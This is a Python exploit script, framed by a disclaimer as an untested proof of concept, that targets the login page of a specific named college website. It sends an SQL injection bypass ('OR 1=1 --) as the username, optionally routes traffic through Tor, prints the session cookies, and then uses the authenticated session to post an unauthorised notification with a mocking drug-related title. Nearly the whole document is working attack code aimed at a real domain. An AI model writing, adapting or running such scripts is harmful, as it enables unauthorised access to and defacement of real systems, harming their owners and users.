##### Disclaimer : 
# Following code is  just a proof of concept 
# The following exploit has not been tested

##### This expolit is not meant for malicious use

##### The author of this exploit did not :
##### 1) Break into collage servers 
##### 2) Modify any data I did not have ownership to 
##### 3) commit any such act that would prevent legitimate users from accessing the website
##### 4) Looked at or took notes of anything that was not open to the public and under the public domain



# Date : 1 February 2022

# Client side input sanitation allows remote attacker to input special characters that break the SQL querie. After sucessful login, attempt is made to send a 
# notification to prove the vulnerability.

# If this dosen't work, just input 'OR 1=1 -- as username and leave the password empty




import requests
import argparse
import time

url = 'https://jksbotelive.com/'
urllogin = url + "login.php"
urlhandler = url + "handler.php"
#########################################
parser = argparse.ArgumentParser(description="Demostration for SQL injection in www.jksbotelive.com")
parser.add_argument('-t' ,'--tor' , action='store_true' ,help='Use proxy on 9050')
parser.add_argument('-v' , '--verbose' , action='store_true' , help='Verbose output')
args = parser.parse_args()
##########################################

if args.tor: 
    if args.verbose:
        print('Setting proxies for tor . . .')
    proxies={
            'http' : 'socks5://localhost:9050',
            'https' : 'socks5://localhost:9050'
             }
else:
    proxies=False
payload = {
	"username": "'OR 1=1 --",
	"password": "",
	"page": "login",
	"Submit": "Login"
}
payload2 ={
"page" : "upload",
"title" : "I just took some molly, what else?",
"typ" : "anc",
"catagory" : "2"
}
headers = {
    "User-Agent" : "UwU" ,
    "From" : "UwU"  
}
#########################################3

if args.verbose:
    print('Opening request session . . .')
s = requests.Session()
if args.verbose:
    print('Done')

print('Trying to get cookies . . .\nSending payload . . . ')

try:
    x =s.post(urllogin, data=payload ,proxies=proxies, headers=headers)
    print('Success . . .')
except:
    print('Failed to send payload.')
    exit(1)
if s.cookies:
    print('Cookies are : \n'  + s.cookies )
print('Wating')
time.sleep(6)

try:
    print('Trying to POST on notifications . . .')
    x = s.post(urlhandler, data=payload2 ,proxies=proxies, headers=headers)
    print('Done')
except:
    print('Failed to send notification')

